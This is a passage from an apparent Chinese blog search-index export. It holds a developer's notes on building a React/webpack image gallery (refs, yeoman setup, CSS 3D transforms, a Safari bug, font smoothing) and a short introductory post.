，否则会报错，创建组件实例时也同理，若需要创建多个，可以用一个标签包裹起来 创建组件时，组件的首字母必须大写，否则既不报错也不会正常显示 创建组件时，render函数内return的标签不是真实的DOM节点，那么要怎么在创建的时候取得标签并对其进行操作呢?答：可以在标签中添加ref属性，然后在方法中通过this.refs.REFNAME来取得该组件（方法中自动封装了event对象）： jsx123456789101112131415var MyComponent = React.createClass(&#123; handleClick: function(event) &#123; this.refs.myTextInput.focus(); event.stopPropagation(); event.preventDefault(); &#125;, render: function() &#123; return ( &lt;div&gt; &lt;input type="text" ref="myTextInput" /&gt; &lt;input type="button" value="Focus the text input" onClick=&#123;this.handleClick&#125; /&gt; &lt;/div&gt; ); &#125;&#125;); ————————项目开始————————脚手架工具yeomanyeoman能够自动构建好最佳的代码结构（基于Nodejs）安装：npm i -g yo选择相关的项目生成器：（本项目使用基于webpack来构建react）npm i -g generator-react-webpack查看已安装的generator生成器:1234linux npm ls -g –depth=1 2&gt;/dev/null | grep generator- windows npm ls -g –depth=1 2&gt;/dev/null | findstr generator- 2代表错误消息，/dev/null代表空设备文件，即将错误信息输出到空设备文件上，不显示出来我在windows 下，提示，系统找不到指定的路径。不指定 | findstr generator- ，出了全部的全局一级依赖。生成项目：yo react-webpack react-gallery webpack相关 .jshintrc不能解决jsx的相关问题，所以新版本都使用了.eslintrc（默认包含了.jshintrc） 新版本的webpack.config都模块化的存放在了./cfg目录下 解释：index.html中__REACT_DEVTOOLS_GLOBAL_HOOK__ = parent.__REACT_DEVTOOLS_GLOBAL_HOOK__因为使用React DevTool时，正常的React页面可以直接和ReactDevTools进行通信，但是在使用webpack的热更新时，webpack是将渲染出来的DOM结构以一个iframe进行呈现，所以需要将global环境下的hook赋值给iframe中的hook，才能保证正常通信。 新版本webpack中自动配置了json-loader无需另外配置 项目开始 图片旋转时，需要考虑浏览器的兼容性，这里必须使用较为特殊的驼峰式命名 jsx1234567//如果图片旋转角度有值，且不为0if(this.props.arrange.rotate)&#123; //对各种浏览器的兼容性，必须用驼峰式命名 ['MozTransform','msTransform','WebkitTransform','transform'].forEach(function(value)&#123; styleObj[value] = 'rotate('+this.props.arrange.rotate+'deg)'; &#125;.bind(this));&#125; 给居中的图片添加z-index，避免遮盖 123456//添加z-index 避免遮盖if(this.props.arrange.isCenter)&#123; styleObj.zIndex = 11;&#125; else &#123; styleObj.zIndex = 0;&#125; 图片样式中的transform-style/perspective/transform-origintransform-style属性是3D空间一个重要属性，指定嵌套元素如何在3D空间中呈现。他主要有两个属性值：flat和preserve-3d。其中flat值为默认值，表示所有子元素在2D平面呈现。preserve-3d表示所有子元素在3D空间中呈现。perspective属性对于3D变形来说至关重要。该属性会设置查看者的位置，并将可视内容映射到一个视锥上，继而投到一个2D视平面上。如果不指定透视，则Z轴空间中的所有点将平铺到同一个2D视平面中，并且变换结果中将不存在景深概念。上面的描述可能让人难以理解一些，其实对于perspective属性，我们可以简单的理解为视距，用来设置用户和元素3D空间Z平面之间的距离。而其效应由他的值来决定，值越小，用户与3D空间Z平面距离越近，视觉效果更令人印象深刻；反之，值越大，用户与3D空间Z平面距离越远，视觉效果就很小。transform-origin: 0 50% 0; /*将旋转中心定为左线（默认值是中心点 50% 50% 0）*/ 接上条，因为使用了transform-style:3d诱发了一个在Safari中的旋转bug翻转了图片之后img-front被旋转了180盖在了img-back之上，正常情况下应该是img-back在上如下图：解决方法：添加transformZ(1px)给他一个Z轴上的位移，让它盖住img-front。 在Safari的Retina显示屏下，nav中的图表不清晰亮色字体在深色的背景下渲染会显得粗糙，因为使用的亚像素渲染（使用RGB混合来呈现，较灰阶渲染效果更好，消耗内存也更多，手机上没有采用，mac上大量采用），因此要开启灰阶渲染（控制轮廓上像素点的亮度来达到字体原始形状） 12-webkit-font-smoothing: antialiased;-moz-font-smoothing: grayscale; 详细解释：&emsp;&emsp;理想的字体其边缘的过渡是非常平滑的，但是在屏幕上显示的时候需要将字体栅格化为一个个像素点，采用黑白像素点渲染，无法体现字体的细节之处，会造成边缘呈现锯齿状的不平滑。&emsp;&emsp;为了解决这个问题，字体渲染引擎采用了一些方法去进行平滑，其中就包括灰阶渲染和亚像素渲染&emsp;&emsp;灰阶渲染是通过控制字体轮廓上像素点的亮度，达到字体原始形状的方法&emsp;&emsp;亚像素渲染则利用了LCD屏幕中每个像素是由RGB三个亚像素的颜色和亮度混合而成一个完整像素的颜色这一原理，将字体上的轮廓点由三个亚像素体现达到原始形状的方法，与灰阶渲染相比，分辨率在垂直方向上放大了三倍，因此，渲染效果更好。但是，所消耗的内存也更多。&emsp;&emsp;因此在手机屏幕上，为了减少CPU的开销，使用灰阶渲染。但是在macOS操作系统上，采用的是亚像素渲染这种方式。这会导致白色、亮色的字体，在深色背景下会显得过粗，严重情况下看上去会模糊。]]></content>
      <categories>
        <category>作品</category>
      </categories>
      <tags>
        <tag>react</tag>
        <tag>webpack</tag>
        <tag>gallery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第一个脚印]]></title>
    <url>%2FHello-World.html</url>
    <content type="text"><![CDATA[写在前面 我是陈凯鑫，熟悉的朋友都爱叫我开心。我是一个默默走在代码漫漫长路上的乐观积极的前端er。没有太多的天赋，因为热爱，所以坚持。渴望学习，同时也乐于分享。非常欢迎大家访问我的GitHub，里面有我的一些学习和自己创作的小作品 一个基于react和webpack的画廊小作品 一个手机阅读器的WebApp 一个响应式的WebDemo 一个基于Vue1.0的外卖WebApp 接下来最开始的几篇博客我就来写一写做这些小作品的时候遇到的坑和一些重难点吧网站板块右侧主体部分提供所有文章的]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>essay</tag>
      </tags>
  </entry>
</search>
